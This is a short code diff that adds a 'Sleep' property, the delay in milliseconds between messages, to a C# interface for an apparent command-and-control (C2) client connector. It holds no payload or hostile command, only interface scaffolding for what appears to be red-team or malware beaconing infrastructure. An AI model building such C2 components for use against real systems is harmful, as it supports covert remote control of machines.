@@ -20,6 +20,11 @@ namespace ClientC2.interfaces
         IC2Channel ServerChannel { get; }
 
         /// <summary>
+        ///     The amount of time in milliseconds between messages
+        /// </summary>
+        int Sleep { get; }
+
+        /// <summary>
         ///     Main initialization function of the C2 Connector
         /// </summary>
         Func<bool> Initialize { get; }
